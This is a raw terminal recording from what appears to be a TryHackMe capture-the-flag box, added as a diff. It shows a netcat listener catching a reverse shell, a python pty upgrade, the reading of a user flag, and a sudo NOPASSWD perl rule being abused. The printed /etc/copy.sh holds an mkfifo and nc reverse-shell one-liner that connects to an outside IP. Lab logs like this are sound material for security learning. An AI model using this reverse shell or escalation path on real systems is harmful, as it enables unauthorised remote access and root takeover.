@@ -1,0 +1,46 @@
+Script started on 2025-03-31 03:30:25+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/5" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 6020
+SOCKET: Shell has connected! PID: 2697
+[K[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[Kwww-data@THM-Chal:/var/www/html/content/inc/ads$ [Kwww-data@THM-Chal:/var/www/html/content/inc/ads$ [K[?2004hwww-data@THM-Chal:/var/www/html/content/inc/ads$ id[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hid
+[Kid
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@THM-Chal:/var/www/html/content/inc/ads$ [Kwww-data@THM-Chal:/var/www/html/content/inc/ads$ [K[?2004hwww-data@THM-Chal:/var/www/html/content/inc/ads$ cd /home[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /home
+[Kcd /home
+www-data@THM-Chal:/home$ [Kwww-data@THM-Chal:/home$ [K[?2004hwww-data@THM-Chal:/home$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+itguy
+www-data@THM-Chal:/home$ [Kwww-data@THM-Chal:/home$ [K[?2004hwww-data@THM-Chal:/home$ cd     [Kitguy[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd itguy
+[Kcd itguy
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+Desktop    Downloads  Pictures	Templates  backup.pl	     mysql_login.txt
+Documents  Music      Public	Videos	   examples.desktop  user.txt
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ cat user.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat user.txt
+[Kcat user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ cat backup.pl[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat backup.pl
+[Kcat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ sudo -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo -l
+[Ksudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:[KUser www-data may run the following commands on THM-Chal:[KUser www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ cat [7m/etc/copy.sh[27m[7mcat [27m/etc/copy.sh[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat /etc/copy.sh
+[Kcat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.61.245 4444 >/tmp/f
+www-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ sudo [7m/usr/bin/perl /home/itguy/backup.pl[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7msudo [27m/usr/bin/perl /home/itguy/backup.pl[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hsudo /usr/bin/perl /home/itguy/backup.pl
+[Ksudo /usr/bin/perl /home/itguy/backup.pl
+[Kwww-data@THM-Chal:/home/itguy$ [Kwww-data@THM-Chal:/home/itguy$ [K[?2004hwww-data@THM-Chal:/home/itguy$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[?2004l
+Script done on 2025-03-31 03:33:23+03:00 [COMMAND_EXIT_CODE="0"]
